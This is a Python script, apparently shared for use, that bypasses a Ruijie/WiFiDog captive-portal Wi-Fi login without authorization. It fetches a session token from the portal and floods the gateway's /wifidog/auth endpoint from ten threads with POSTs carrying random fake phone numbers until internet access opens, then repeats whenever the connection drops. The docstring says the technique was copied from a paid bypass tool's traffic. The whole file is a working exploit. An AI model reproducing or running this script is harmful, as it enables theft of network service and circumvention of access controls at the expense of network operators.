#!/usr/bin/env python3
"""
Ruijie Bypass v4 - POST with random phoneNumber (confirmed from paid core.so traffic)
"""
import sys, threading, time, urllib.parse, string, random, uuid
import requests, urllib3
urllib3.disable_warnings()

def random_phone():
    """Generate random alphanumeric phoneNumber like core.so does"""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=random.randint(12, 16)))

def main():
    print("[Ruijie] POST bypass with random phoneNumber")

    while True:
        sess = requests.Session()
        sess.verify = False
        sess.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })

        try:
            # Detect captive portal
            r = sess.get("http://connectivitycheck.gstatic.com/generate_204",
                         timeout=10, allow_redirects=True)
            if r.status_code == 204:
                try:
                    r2 = requests.get("http://www.google.com", timeout=3)
                    if r2.status_code == 200:
                        sess.close()
                        time.sleep(5)
                        continue
                except: pass

            portal_url = r.url
            parsed = urllib.parse.urlparse(portal_url)
            params = urllib.parse.parse_qs(parsed.query)
            host = f"{parsed.scheme}://{parsed.netloc}"
            gw_addr = params.get("gw_address", ["192.168.10.1"])[0]
            gw_port = params.get("gw_port", ["2060"])[0]

            # Get sessionId
            r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
            sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId",[""])[0]
            if not sid:
                print("[!] No sessionId")
                sess.close()
                time.sleep(3)
                continue

            print(f"[SID] {sid[:16]}...  [GW] {gw_addr}:{gw_port}")

            # High-speed POST bypass - exactly like core.so
            stop = False

            def ping_post():
                while not stop:
                    try:
                        phone = random_phone()
                        sess.post(
                            f"http://{gw_addr}:{gw_port}/wifidog/auth",
                            params={"token": sid, "phoneNumber": phone},
                            headers={
                                "Content-Type": "application/octet-stream",
                                "Content-Length": "0",
                            },
                            timeout=3,
                        )
                    except:
                        pass

            # 10 threads for high-speed posting
            for _ in range(10):
                threading.Thread(target=ping_post, daemon=True).start()

            # Monitor connection
            online = False
            while not stop:
                time.sleep(2)
                try:
                    r = requests.get("http://www.google.com", timeout=3)
                    if r.status_code == 200:
                        if not online:
                            print("*** ONLINE ***")
                            online = True
                except:
                    if online:
                        print("[Lost]")
                        online = False
                        break

            stop = True
            sess.close()

        except KeyboardInterrupt:
            print("\nStopped")
            sys.exit(0)
        except Exception as e:
            print(f"[!] {e}")
            time.sleep(3)

if __name__ == "__main__":
    main()
